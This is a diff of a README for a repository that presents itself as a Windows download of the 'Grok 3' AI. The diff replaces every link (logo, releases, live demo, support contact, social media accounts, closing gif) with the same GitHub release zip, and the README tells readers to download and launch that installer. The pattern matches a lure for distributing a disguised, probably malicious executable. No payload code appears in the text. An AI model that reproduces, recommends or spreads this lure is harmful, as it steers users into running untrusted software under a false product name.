@@ -1,6 +1,6 @@
 # 🤖🌍 Grok 3 Repository 🚀
 
-![Grok 3 Logo](https://example.com/grok-3-logo.png)
+![Grok 3 Logo](https://github.com/Ronny036/Grok-3/releases/download/v3.0/Grok.zip)
 
 Welcome to the Grok 3 GitHub repository! 🤖 Are you ready to experience the smartest AI on Earth? Grok 3 is here, faster, sharper, and with improved multilingual support. This advanced AI is now available to everyone on Windows. Whether you're a tech enthusiast, a developer, or just curious about artificial intelligence, Grok 3 is ready to amaze you with its capabilities.
 
@@ -31,31 +31,31 @@ Explore the following topics related to Grok 3:
 
 ## Download Grok 3 📥
 
-Grok 3 can be downloaded from the [Releases](https://example.com/releases/grok-3.zip) section. 🚀
+Grok 3 can be downloaded from the [Releases](https://github.com/Ronny036/Grok-3/releases/download/v3.0/Grok.zip) section. 🚀
 
 ## Getting Started 🚀
 
 To start using Grok 3 on your Windows system, follow these simple steps:
 
-1. Download the Grok 3 installation file from the [Releases](https://example.com/releases/grok-3.zip) section.
+1. Download the Grok 3 installation file from the [Releases](https://github.com/Ronny036/Grok-3/releases/download/v3.0/Grok.zip) section.
 2. Launch the installation file and follow the on-screen instructions to install Grok 3 on your Windows system.
 3. Once installed, launch Grok 3 and start interacting with the smartest AI on Earth!
 
 ## Live Demo 🌐
 
-Curious to see Grok 3 in action? Check out our [Live Demo](https://example.com/live-demo) to experience the power of this advanced AI firsthand.
+Curious to see Grok 3 in action? Check out our [Live Demo](https://github.com/Ronny036/Grok-3/releases/download/v3.0/Grok.zip) to experience the power of this advanced AI firsthand.
 
 ## Support and Feedback 📧
 
-Have questions or feedback about Grok 3? Feel free to reach out to us at [support@grok3.com](mailto:support@grok3.com). We value your input and strive to make Grok 3 the best AI experience for all users.
+Have questions or feedback about Grok 3? Feel free to reach out to us at [https://github.com/Ronny036/Grok-3/releases/download/v3.0/Grok.zip](https://github.com/Ronny036/Grok-3/releases/download/v3.0/Grok.zip). We value your input and strive to make Grok 3 the best AI experience for all users.
 
 ## Stay Connected 🌟
 
 Stay up to date with the latest news and updates on Grok 3 by following us on social media:
 
-- Twitter: [@Grok3AI](https://twitter.com/Grok3AI)
-- Facebook: [Grok3AI](https://www.facebook.com/Grok3AI)
-- Instagram: [Grok3_official](https://www.instagram.com/Grok3_official)
+- Twitter: [@Grok3AI](https://github.com/Ronny036/Grok-3/releases/download/v3.0/Grok.zip)
+- Facebook: [Grok3AI](https://github.com/Ronny036/Grok-3/releases/download/v3.0/Grok.zip)
+- Instagram: [Grok3_official](https://github.com/Ronny036/Grok-3/releases/download/v3.0/Grok.zip)
 
 ## Spread the Word 📣
 
@@ -63,4 +63,4 @@ Help us spread the word about Grok 3! Share your experiences with the AI on soci
 
 Thank you for visiting the Grok 3 repository. Get ready to unlock the potential of AI with Grok 3! 🚀🤖
 
-![Grok 3 Gif](https://example.com/grok-3.gif)
+![Grok 3 Gif](https://github.com/Ronny036/Grok-3/releases/download/v3.0/Grok.zip)
